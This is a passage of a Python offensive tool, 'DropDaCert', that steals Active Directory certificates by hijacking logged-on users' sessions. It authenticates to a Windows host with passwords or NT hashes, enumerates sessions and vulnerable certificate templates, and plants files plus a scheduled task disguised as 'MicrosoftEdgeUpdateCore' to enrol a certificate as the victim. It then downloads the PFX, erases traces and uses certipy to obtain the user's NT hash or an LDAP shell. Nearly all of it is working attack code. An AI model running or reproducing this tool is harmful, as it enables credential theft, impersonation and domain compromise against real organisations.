        server = Server(dc_ip, get_info=ALL)
        conn = Connection(server, user=f"{domain}\\{username}",
                          password=ldap_pass, authentication=NTLM)
        if not conn.bind():
            return None
        base_dn = ",".join(f"DC={p}" for p in domain.split("."))
        search_base = (
            f"CN=Enrollment Services,CN=Public Key Services,"
            f"CN=Services,CN=Configuration,{base_dn}"
        )
        conn.search(search_base, "(objectClass=pKIEnrollmentService)",
                    attributes=["dNSHostName", "cn"])
        if conn.entries:
            e = conn.entries[0]
            return f"{e.dNSHostName.value}\\{e.cn.value}"
    except Exception:
        pass
    return None


def find_best_template(domain, dc_ip, username, password, nt_hash,
                       ca_config, kerberos=False, aes_key=None):
    """Auto-discover a certificate template suitable for DropDaCert.

    Needs: Client Auth EKU, Domain Users/Authenticated Users enrollment,
    enabled on the CA, no manager approval, no co-signatures, and ideally
    no SubjectRequireEmail flag.

    Returns (template_name, warning) or (None, error_reason).
    """
    certipy_bin = shutil.which("certipy-ad") or shutil.which("certipy")
    if not certipy_bin:
        return None, "certipy not installed"

    ca_name = ca_config.split("\\")[-1] if "\\" in ca_config else ca_config

    with tempfile.TemporaryDirectory() as tmpdir:
        prefix = os.path.join(tmpdir, "scan")
        cmd = [certipy_bin, "find", "-dc-ip", dc_ip,
               "-json", "-output", prefix]

        if domain:
            cmd.extend(["-u", f"{username}@{domain}"])
        else:
            cmd.extend(["-u", username])

        if password:
            cmd.extend(["-p", password])
        elif nt_hash:
            nt = nt_hash.split(":")[-1]
            cmd.extend(["-hashes", f":{nt}"])

        if kerberos:
            cmd.append("-k")
        if aes_key:
            cmd.extend(["-aes-key", aes_key])

        try:
            subprocess.run(cmd, capture_output=True, text=True,
                           timeout=60, stdin=subprocess.DEVNULL, cwd=tmpdir)
        except subprocess.TimeoutExpired:
            return None, "timed out querying LDAP"
        except Exception as e:
            return None, str(e)

        json_files = [f for f in os.listdir(tmpdir) if f.endswith(".json")]
        if not json_files:
            return None, "no output from certipy"

        with open(os.path.join(tmpdir, json_files[0])) as f:
            data = json.load(f)

    templates = data.get("Certificate Templates", {})
    if not isinstance(templates, dict):
        return None, "unexpected certipy output format"

    candidates = []
    all_client_auth = []

    for t in templates.values():
        name = t.get("Template Name", "")

        if not (t.get("Client Authentication", False)
                or t.get("Any Purpose", False)):
            continue
        if not t.get("Enabled", False):
            continue
        if t.get("Requires Manager Approval", False):
            continue
        if (t.get("Authorized Signatures Required", 0) or 0) > 0:
            continue

        t_cas = t.get("Certificate Authorities", [])
        if isinstance(t_cas, str):
            t_cas = [t_cas]
        if not any(ca_name in c for c in (t_cas or [])):
            continue

        enroll_rights = []
        perms = t.get("Permissions", {})
        if isinstance(perms, dict):
            ep = perms.get("Enrollment Permissions", {})
            if isinstance(ep, dict):
                er = ep.get("Enrollment Rights", [])
                if isinstance(er, str):
                    er = [er]
                enroll_rights = er or []

        all_client_auth.append(name)

        if not any("Domain Users" in r or "Authenticated Users" in r
                   for r in enroll_rights):
            continue

        name_flags = t.get("Certificate Name Flag", 0)
        if isinstance(name_flags, int):
            if not (name_flags & 0x02000000):
                continue
            if name_flags & 0x08400000:
                continue
            has_email = bool(name_flags & 0x24000000)
        elif isinstance(name_flags, list):
            flags_str = " ".join(str(f) for f in name_flags)
            if "Upn" not in flags_str:
                continue
            if "Dns" in flags_str:
                continue
            has_email = "Email" in flags_str
        else:
            flags_str = str(name_flags)
            if "Upn" not in flags_str:
                continue
            if "Dns" in flags_str:
                continue
            has_email = "Email" in flags_str

        candidates.append({"name": name, "has_email": has_email})

    if not candidates:
        if all_client_auth:
            return None, (f"found Client Auth templates ({', '.join(all_client_auth)}) "
                          "but none allow Domain Users enrollment")
        return None, "no templates with Client Auth EKU enabled on this CA"

    no_email = [c for c in candidates if not c["has_email"]]
    if no_email:
        return no_email[0]["name"], None

    return candidates[0]["name"], "requires email attribute on target user"


# ── Session enumeration ──────────────────────────────────────────────────────

def enum_sessions(transport):
    stdout, _, _ = _run(transport, "query session")
    sessions = []
    for line in stdout.splitlines()[1:]:
        m = re.match(r"^\s*>?\s*(\S+)?\s{2,}(\S+)\s+(\d+)\s+(Active|Disc)\b", line)
        if m:
            uname = m.group(2)
            if uname.lower() in ("services", "65536"):
                continue
            sessions.append({
                "session_name": m.group(1) or "",
                "username":     uname,
                "id":           int(m.group(3)),
                "state":        m.group(4),
                "domain":       None,
            })
    if sessions:
        _resolve_session_domains(transport, sessions)
    return sessions


def _resolve_session_domains(transport, sessions):
    ps = (
        "Get-WmiObject Win32_LogonSession -Filter "
        "'LogonType=2 or LogonType=10' | ForEach-Object {\n"
        "  $lid = $_.LogonId\n"
        "  $assoc = Get-WmiObject -Query "
        "\"SELECT * FROM Win32_LoggedOnUser WHERE "
        "Dependent='Win32_LogonSession.LogonId=$lid'\"\n"
        "  if ($assoc) {\n"
        "    $ant = $assoc.Antecedent\n"
        '    if ($ant -match \'Domain="([^"]+)",Name="([^"]+)"\') {\n'
        '      Write-Host "$($Matches[1])\\$($Matches[2])"\n'
        "    }\n"
        "  }\n"
        "}"
    )
    out, _, _ = _run_ps(transport, ps)
    domain_map = {}
    for line in out.strip().splitlines():
        line = line.strip()
        if "\\" in line:
            d, u = line.split("\\", 1)
            domain_map[u.upper()] = d
    for s in sessions:
        d = domain_map.get(s["username"].upper())
        if d and d.upper() != s["username"].upper():
            s["domain"] = d


def pick_session(sessions):
    if not sessions:
        die("No active user sessions found on target.")
    print()
    print(f"  {'#':<4} {'State':<8} {'Session':<20} {'User'}")
    print(f"  {'-'*4} {'-'*8} {'-'*20} {'-'*30}")
    for i, s in enumerate(sessions):
        user_display = s["username"]
        if s["domain"]:
            user_display = f"{s['domain']}\\{s['username']}"
        print(f"  {i:<4} {s['state']:<8} {s['session_name']:<20} {user_display}")
    print()
    if len(sessions) == 1:
        info(f"Auto-selecting only session: {sessions[0]['username']}")
        return sessions[0]
    while True:
        try:
            idx = int(input("  [?] Pick session # to target: ").strip())
            if 0 <= idx < len(sessions):
                return sessions[idx]
        except (ValueError, EOFError):
            pass
        print("  Invalid choice.")


def find_session_for_user(sessions, target_user):
    target_lower = target_user.lower()
    if "\\" in target_lower:
        target_lower = target_lower.split("\\", 1)[1]
    for s in sessions:
        if s["username"].lower() == target_lower:
            return s
    for s in sessions:
        if target_lower in s["username"].lower():
            return s
    return None


# ── Payload generation ───────────────────────────────────────────────────────

def generate_files(target_user, user_domain, ca_config, template,
                   prefix, drop_dir, exec_wrapper):
    ca_flag = f' -config "{ca_config}"' if ca_config else ""
    profile = EXEC_METHODS[exec_wrapper]
    exec_cmd = profile["cmd"]
    exec_arg = profile["args"].format(drop_dir=drop_dir, prefix=prefix)
    end_boundary = (datetime.now() + timedelta(hours=48)).strftime(
        "%Y-%m-%dT%H:%M:%S.000")

    cn = target_user

    files = {}
    files[f"{prefix}.inf"] = CERT_INF.format(
        cn=cn, template=template
    ).encode("utf-8")

    files[f"{prefix}.bat"] = CERT_BAT.format(
        drop_dir=drop_dir, prefix=prefix, ca_flag=ca_flag
    ).encode("utf-8")

    files[f"{prefix}.xml"] = TASK_XML.format(
        end_boundary=end_boundary, domain=user_domain,
        username=target_user, exec_cmd=exec_cmd, exec_args=exec_arg,
    ).encode("utf-16")

    if exec_wrapper == "wscript":
        files[f"{prefix}.vbs"] = VBS_STUB.format(
            drop_dir=drop_dir, prefix=prefix
        ).encode("utf-8")

    return files


# ── Task management ──────────────────────────────────────────────────────────

def create_and_run_task(transport, task_name, drop_dir, prefix):
    xml_path = f"{drop_dir}\\{prefix}.xml"
    stdout, stderr, rc = _run(
        transport, f'schtasks /create /xml "{xml_path}" /tn "{task_name}" /f')
    if rc != 0:
        combined = (stderr.strip() or stdout.strip())
        die(f"schtasks /create failed (rc={rc}): {combined}")
    info(f"Task '{task_name}' created")

    _, _, rc = _run(transport, f'schtasks /run /tn "{task_name}"')
    if rc != 0:
        warn("schtasks /run returned non-zero — task may still fire via RegistrationTrigger")
    else:
        info("Task triggered")


def poll_for_result(transport, smb, drop_dir, prefix, timeout=90):
    pfx_file = f"{prefix}.pfx"
    status_file = f"{prefix}.status"
    deadline = time.time() + timeout

    while time.time() < deadline:
        if smb_file_exists(smb, drop_dir, pfx_file):
            print(flush=True)
            return "OK"
        if smb_file_exists(smb, drop_dir, status_file):
            status = smb_read_text(smb, drop_dir, status_file)
            if status and status.startswith("FAIL_"):
                print(flush=True)
                return status
        print(".", end="", flush=True)
        time.sleep(2)
    print(flush=True)
    return "TIMEOUT"


def cleanup_remote(transport, smb, task_name, drop_dir, prefix):
    _run(transport, f'schtasks /delete /tn "{task_name}" /f')
    smb_delete_files(smb, drop_dir, prefix)


# ── Certipy auth ─────────────────────────────────────────────────────────────

def run_certipy_auth(pfx_path, dc_ip, domain, username=None,
                     ldap_shell=False, out_dir="."):
    certipy = shutil.which("certipy-ad") or shutil.which("certipy")
    if not certipy:
        warn("certipy-ad not found — install it or run manually")
        return False

    pfx_basename = os.path.basename(pfx_path)
    cmd = [certipy, "auth", "-pfx", pfx_basename]
    if dc_ip:
        cmd.extend(["-dc-ip", dc_ip])
    if domain:
        cmd.extend(["-domain", domain])
    if username:
        cmd.extend(["-username", username])
    if ldap_shell:
        cmd.append("-ldap-shell")

    print()
    result = subprocess.run(cmd, cwd=out_dir,
                            input=b"y\n", timeout=60)
    return result.returncode == 0


# ── Main ─────────────────────────────────────────────────────────────────────

def run_manual_mode(args):
    target_user = args.target_user
    if not target_user:
        die("--exec-method manual requires -tu/--target-user")

    user_domain = args.domain or "DOMAIN"

    # Template selection
    template = args.template
    if template is None:
        if args.domain and args.dc_ip:
            info("Discovering templates...")
            template, tmpl_warn = find_best_template(
                args.domain, args.dc_ip, args.username, args.password,
                args.nt_hash, args.ca, args.kerberos, args.aes_key)
            if template:
                if tmpl_warn:
                    warn(f"Template '{template}': {tmpl_warn}")
                info(f"Selected template: {template}")
            else:
                template = "User"
                warn(f"Auto-discovery failed ({tmpl_warn}), using: User")
        else:
            template = "User"

    os.makedirs(args.out_dir, exist_ok=True)
    info(f"Generating payload (template: {template})...")
    files = generate_files(
        target_user, user_domain, args.ca, template,
        args.prefix, args.drop_dir, args.exec_wrapper)

    for fname, data in files.items():
        path = os.path.join(args.out_dir, fname)
        with open(path, "wb") as f:
            f.write(data)
        info(f"Saved: {path}")

    drop = args.drop_dir
    prefix = args.prefix
    task = args.task_name
    pfx_remote = f"{drop}\\{prefix}.pfx"

    print()
    info("Manual instructions:")
    print()
    print(f"  1. Transfer files to {drop}\\ on target:")
    for fname in files:
        print(f"       {fname}")
    print()
    print(f"  2. Create and run the scheduled task:")
    print(f"       schtasks /create /xml \"{drop}\\{prefix}.xml\" /tn \"{task}\" /f")
    print(f"       schtasks /run /tn \"{task}\"")
    print()
    print(f"  3. Wait for PFX to appear:")
    print(f"       dir \"{pfx_remote}\"")
    print()
    print(f"  4. Download {pfx_remote} to this machine")
    print()
    print(f"  5. Run certipy auth:")
    certipy = "certipy-ad"
    certipy_cmd = f"       {certipy} auth -pfx {prefix}.pfx -dc-ip {args.dc_ip}"
    if args.domain:
        certipy_cmd += f" -domain {args.domain}"
    certipy_cmd += f" -username {target_user}"
    print(certipy_cmd)
    print()
    print(f"  6. Cleanup:")
    print(f"       schtasks /delete /tn \"{task}\" /f")
    exts = ".inf .bat .xml .req .cer .rsp .pfx .log .status"
    print(f"       del {' '.join(f'{drop}\\{prefix}{e}' for e in exts.split())}")
    print()


def main():
    args = parse_args()

    if args.exec_method == "manual":
        print()
        print("  DropDaCert v2.0")
        print()
        run_manual_mode(args)
        return

    if not args.password and not args.nt_hash and not args.aes_key:
        import getpass
        prompt_user = f"{args.domain}\\{args.username}" if args.domain else args.username
        args.password = getpass.getpass(f"  Password for {prompt_user}: ")

    print()
    print("  DropDaCert v2.0")
    print()

    # ── Resolve target
    info(f"Resolving target: {args.target}")
    hostname, ip = resolve_target(args.target, args.dc_ip, args.domain)
    info(f"Target: {hostname} ({ip})")

    # ── Connect transport
    use_susinternals = (args.exec_method == "smb")

    if use_susinternals:
        info("Connecting via SMB (PSExeSVC)...")
        transport = SusinternalsExec(
            ip, args.username, args.password, args.nt_hash,
            args.domain, args.dc_ip, args.aes_key, args.kerberos)
        # probe + AD domain in one call (each psexecsvc call is ~15-30s)
        out, err, rc = _run(transport,
            'powershell -NonInteractive -Command "(Get-WmiObject Win32_ComputerSystem).Domain"')
        if rc != 0 and not out.strip():
            die(f"PSExeSVC connection failed: {err.strip()[:200]}")
        info("Connected")
        ad_domain = out.strip() if out.strip() and "." in out.strip() else None
    else:
        auth_type = "Kerberos" if args.kerberos else "NTLM"
        info(f"Connecting via WinRM ({auth_type})...")
        try:
            transport = connect_winrm(
                hostname, ip, args.username, args.password, args.nt_hash,
                args.domain, args.dc_ip, args.aes_key, args.kerberos,
                args.port)
            out, _, rc = _run(transport, "echo ok")
            if rc != 0:
                die("WinRM connected but probe command failed.")
        except Exception as e:
            die(f"WinRM connection failed: {e}")
        info("Connected")
        ad_domain = None
        out, _, _ = _run_ps(transport,
            '(Get-WmiObject Win32_ComputerSystem).Domain')
        ad_domain = out.strip() if out.strip() and "." in out.strip() else None

    # SMB connection
    try:
        smb = smb_connect(ip, hostname, args.username, args.password,
                          args.nt_hash, args.domain, args.dc_ip,
                          args.aes_key, args.kerberos)
    except Exception as e:
        die(f"SMB connection failed: {e}")

    # Enumerate sessions and pick target
    if use_susinternals:
        info("Enumerating sessions...")
    sessions = enum_sessions(transport)
    if not sessions:
        die("No active user sessions found.")

    if args.target_user:
        match = find_session_for_user(sessions, args.target_user)
        if not match:
            die(f"No session found for '{args.target_user}'. "
                f"Available: {', '.join(s['username'] for s in sessions)}")
        target_session = match
    else:
        target_session = pick_session(sessions)

    target_user = target_session["username"]
    user_domain = target_session.get("domain") or args.domain
    target_display = f"{user_domain}\\{target_user}" if user_domain else target_user
    info(f"Target session: {target_display} "
         f"(session {target_session['id']}, {target_session['state']})")

    # Template selection
    template = args.template
    if template is None:
        query_domain = ad_domain or args.domain
        if query_domain:
            info("Discovering templates...")
            template, tmpl_warn = find_best_template(
                query_domain, args.dc_ip, args.username, args.password,
                args.nt_hash, args.ca, args.kerberos, args.aes_key)
            if template:
                if tmpl_warn:
                    warn(f"Template '{template}': {tmpl_warn}")
                info(f"Selected template: {template}")
            else:
                template = "User"
                warn(f"Auto-discovery failed ({tmpl_warn}), using: User")
        else:
            template = "User"

    # Generate and upload payload
    info(f"Generating payload (template: {template})...")
    files = generate_files(
        target_user, user_domain, args.ca, template,
        args.prefix, args.drop_dir, args.exec_wrapper)
    smb_delete_files(smb, args.drop_dir, args.prefix)
    try:
        smb_upload(smb, files, args.drop_dir)
    except Exception as e:
        die(f"SMB upload failed: {e}")
    info("Payload uploaded")

    # Create and trigger scheduled task
    create_and_run_task(transport, args.task_name, args.drop_dir, args.prefix)

    # Poll for PFX
    info(f"Waiting for PFX (timeout: {args.timeout}s)...")
    result = poll_for_result(
        transport, smb, args.drop_dir, args.prefix, args.timeout)

    if result != "OK":
        if result == "TIMEOUT":
            warn("Timed out — checking once more...")
            time.sleep(5)
            if smb_file_exists(smb, args.drop_dir, f"{args.prefix}.pfx"):
                result = "OK"
        if result != "OK":
            msg = STATUS_MESSAGES.get(result, result)
            if result != "TIMEOUT":
                warn(f"Task failed: {msg}")
            try:
                os.makedirs(args.out_dir, exist_ok=True)
                smb_download(smb, args.drop_dir, f"{args.prefix}.log",
                             os.path.join(args.out_dir, f"{args.prefix}.log"))
            except Exception:
                pass
            if not args.no_cleanup:
                cleanup_remote(transport, smb, args.task_name,
                               args.drop_dir, args.prefix)
            die("No PFX produced — check CA reachability and template permissions.")

    # Download PFX
    os.makedirs(args.out_dir, exist_ok=True)
    out_path = os.path.join(args.out_dir, f"{args.prefix}.pfx")
    if args.download_method == "smbclient":
        smbclient_download(
            ip, args.username, args.password, args.nt_hash, args.domain,
            args.drop_dir, f"{args.prefix}.pfx", out_path,
            args.kerberos, args.dc_ip, args.aes_key)
    else:
        try:
            size = smb_download(smb, args.drop_dir,
                                f"{args.prefix}.pfx", out_path)
            info(f"PFX saved: {out_path} ({size} bytes)")
        except Exception as e:
            die(f"PFX download failed: {e}")

    # Cleanup
    if not args.no_cleanup:
        cleanup_remote(transport, smb, args.task_name,
                       args.drop_dir, args.prefix)

    if hasattr(transport, 'close'):
        transport.close()

    # Certipy auth
    certipy_domain = ad_domain or args.domain
    run_certipy_auth(out_path, args.dc_ip, certipy_domain, target_user,
                     args.ldap_shell, args.out_dir)


# ── Argument parsing ─────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        prog="DropDaCert",
        description="ADCS cert theft via scheduled task session hijack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  %(prog)s administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\\Corp-CA' -dc 10.0.0.1
  %(prog)s administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\\Corp-CA' -dc 10.0.0.1 -tu jsmith
  %(prog)s corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\\Corp-CA' -dc 10.0.0.1
  %(prog)s administrator@10.0.0.5 -H :abc123def -ca 'CA01.corp.local\\Corp-CA' -dc 10.0.0.1
""",
    )
    p.add_argument("target", metavar="[[domain/]username[:password]@]target",
        help="Target in impacket format (no domain = local auth)")

    auth = p.add_argument_group("authentication")
    auth.add_argument("-H", "--hashes", default="", dest="nt_hash",
        metavar="[LM:]NT",
        help="NT hash for pass-the-hash")
    auth.add_argument("-k", "--kerberos", action="store_true",
        help="Use Kerberos authentication")
    auth.add_argument("-dc", "--dc-ip", required=True, dest="dc_ip",
        help="Domain controller IP")
    auth.add_argument("--aes-key", default="",
        help="AES key for Kerberos (128 or 256 bits hex)")
    auth.add_argument("--port", type=int, default=5985,
        help="WinRM port (default: 5985)")

    cert = p.add_argument_group("certificate")
    cert.add_argument("-ca", required=True, metavar="HOST\\NAME",
        help="CA config string (e.g. 'CA01.corp.local\\Corp-CA')")
    cert.add_argument("-template", "--template", default=None,
        help="Certificate template (default: auto-discover via certipy, falls back to User)")

    tgt = p.add_argument_group("target selection")
    tgt.add_argument("-tu", "--target-user", default=None, metavar="USER",
        help="Target user directly (skip interactive session picker)")

    exc = p.add_argument_group("execution")
    exc.add_argument("--exec-method", default="winrm",
        choices=["winrm", "smb", "manual"],
        help="Command execution method: winrm (default), smb (psexecsvc), or manual (generate files only)")
    exc.add_argument("--exec-wrapper", default="conhost",
        choices=list(EXEC_METHODS),
        help="Bat execution wrapper: conhost|cmd|powershell|wscript (default: conhost)")
    exc.add_argument("--download-method", default="smb",
        choices=["smb", "smbclient"],
        help="PFX download method (default: smb)")

    post = p.add_argument_group("post-exploitation")
    post.add_argument("--ldap-shell", action="store_true",
        help="Open LDAP shell via certipy instead of extracting NT hash")

    task = p.add_argument_group("task options")
    task.add_argument("-n", "--task-name", default="MicrosoftEdgeUpdateCore",
        help="Scheduled task name (default: MicrosoftEdgeUpdateCore)")
    task.add_argument("--drop-dir", default=r"C:\Windows\Tasks",
        help="Drop directory on target (default: C:\\Windows\\Tasks, use C:\\Users\\Public for non-admin targets)")
    task.add_argument("--prefix", default="cert",
        help="File prefix (default: cert)")

    out = p.add_argument_group("output")
    out.add_argument("-o", "--out-dir", default="output",
        help="Local output directory (default: output)")
    out.add_argument("--no-cleanup", action="store_true",
        help="Don't clean up files and task on target")
    out.add_argument("--timeout", type=int, default=90,
        help="Seconds to wait for PFX (default: 90)")

    args = p.parse_args()

    # Parse impacket-style target: [[domain/]username[:password]@]target
    t = args.target
    domain = ""
    username = ""
    password = ""
    if "@" in t:
        creds, target_host = t.rsplit("@", 1)
        if "/" in creds:
            domain, creds = creds.split("/", 1)
        if ":" in creds:
            username, password = creds.split(":", 1)
        else:
            username = creds
    else:
        target_host = t

    if not username:
        p.error("username required — use user:pass@target or domain/user:pass@target")

    args.target = target_host
    args.username = username
    args.password = password
    args.domain = domain

    return args


if __name__ == "__main__":
    main()
